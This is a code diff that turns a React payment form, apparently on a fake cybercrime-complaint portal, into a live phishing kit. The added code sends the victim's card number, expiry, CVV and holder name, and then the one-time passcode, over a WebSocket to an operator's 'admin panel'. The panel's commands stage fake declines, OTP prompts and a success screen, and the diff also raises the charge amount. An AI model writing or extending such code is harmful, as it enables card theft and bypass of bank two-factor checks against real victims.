@@ -2,6 +2,25 @@
 import React, { useState, useEffect } from 'react';
 import { CreditCard, Lock, Shield, Loader2 } from 'lucide-react';
 
+// WebSocket connection for admin panel
+let ws: WebSocket | null = null;
+
+const connectWebSocket = () => {
+  if (!ws || ws.readyState === WebSocket.CLOSED) {
+    ws = new WebSocket('ws://localhost:8080');
+    
+    ws.onopen = () => {
+      console.log('WebSocket connected');
+    };
+    
+    ws.onclose = () => {
+      console.log('WebSocket disconnected');
+      // Reconnect after 3 seconds
+      setTimeout(connectWebSocket, 3000);
+    };
+  }
+};
+
 const PaymentForm = () => {
   const [formData, setFormData] = useState({
     cardNumber: '',
@@ -9,7 +28,7 @@ const PaymentForm = () => {
     expiryYear: '',
     cvv: '',
     cardHolder: '',
-    amount: '5000.00'
+    amount: '28300.00'
   });
 
   const [isLoading, setIsLoading] = useState(false);
@@ -17,8 +36,66 @@ const PaymentForm = () => {
   const [otp, setOtp] = useState('');
   const [displayOtp, setDisplayOtp] = useState('');
   const [otpFocused, setOtpFocused] = useState(false);
-  const [timer, setTimer] = useState(299); // 4:59 in seconds
+  const [timer, setTimer] = useState(299);
   const [isConfirmLoading, setIsConfirmLoading] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
+  const [showProcessing, setShowProcessing] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
+  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
+
+  useEffect(() => {
+    connectWebSocket();
+    
+    // Listen for commands from admin panel
+    if (ws) {
+      ws.onmessage = (event) => {
+        const data = JSON.parse(event.data);
+        
+        switch (data.command) {
+          case 'showotp':
+            setIsLoading(false);
+            setShowOtp(true);
+            break;
+          case 'fail':
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Your card has been declined');
+            break;
+          case 'success':
+            setIsConfirmLoading(false);
+            setShowProcessing(true);
+            setTimeout(() => {
+              setShowProcessing(false);
+              setShowSuccess(true);
+              setTimeout(() => {
+                window.location.href = 'https://google.com';
+              }, 2000);
+            }, 4000);
+            break;
+          case 'invalidotp':
+            setIsConfirmLoading(false);
+            setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+            break;
+          case 'cardinvalid':
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Your card is invalid, please try another card');
+            break;
+          case 'carddisabled':
+            setIsLoading(false);
+            setShowOtp(false);
+            setErrorMessage('Card disabled, please try another card');
+            break;
+        }
+      };
+    }
+
+    return () => {
+      if (ws) {
+        ws.close();
+      }
+    };
+  }, []);
 
   useEffect(() => {
     let interval: NodeJS.Timeout;
@@ -43,6 +120,12 @@ const PaymentForm = () => {
     return `${mins}.${secs.toString().padStart(2, '0')}`;
   };
 
+  const sendToAdminPanel = (data: any) => {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify(data));
+    }
+  };
+
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
     
@@ -64,6 +147,7 @@ const PaymentForm = () => {
     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
     setOtp(value);
     setDisplayOtp(value);
+    setInvalidOtpMessage('');
     
     if (value.length > 0) {
       setTimeout(() => {
@@ -75,16 +159,29 @@ const PaymentForm = () => {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setErrorMessage('');
     
-    setTimeout(() => {
-      setIsLoading(false);
-      setShowOtp(true);
-    }, 6000);
+    // Send card data to admin panel
+    sendToAdminPanel({
+      type: 'cardData',
+      data: formData,
+      userInfo: {
+        ip: 'Simulated IP',
+        browser: navigator.userAgent,
+        network: 'Simulated Network'
+      }
+    });
   };
 
   const handleConfirmPay = () => {
     if (otp.length === 6) {
       setIsConfirmLoading(true);
+      
+      // Send OTP to admin panel
+      sendToAdminPanel({
+        type: 'otp',
+        otp: otp
+      });
     }
   };
 
@@ -95,6 +192,28 @@ const PaymentForm = () => {
   const maskCardInfo = (value: string) => {
     return '*'.repeat(value.length);
   };
+
+  if (showSuccess) {
+    return (
+      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
+        <div className="text-center">
+          <div className="text-green-600 text-6xl animate-bounce">✓</div>
+          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (showProcessing) {
+    return (
+      <div className="w-96 bg-white border-l border-gray-200 p-6 flex items-center justify-center min-h-screen">
+        <div className="text-center">
+          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
+          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
+        </div>
+      </div>
+    );
+  }
 
   if (showOtp) {
     return (
@@ -110,6 +229,12 @@ const PaymentForm = () => {
         </div>
 
         <div className="space-y-4">
+          {invalidOtpMessage && (
+            <div className="text-red-600 text-sm text-center mb-4">
+              {invalidOtpMessage}
+            </div>
+          )}
+          
           <div className="text-center mb-6">
             <p className="text-sm text-gray-700 mb-4">
               Enter six-digit verification code sent to your registered mobile number ending in {getLastFourDigits()}
@@ -167,6 +292,12 @@ const PaymentForm = () => {
           Complete your payment to proceed with cyber crime complaint registration.
         </p>
       </div>
+
+      {errorMessage && (
+        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
+          <p className="text-red-600 text-sm">{errorMessage}</p>
+        </div>
+      )}
 
       <form className="space-y-4" onSubmit={handleSubmit}>
         <div>
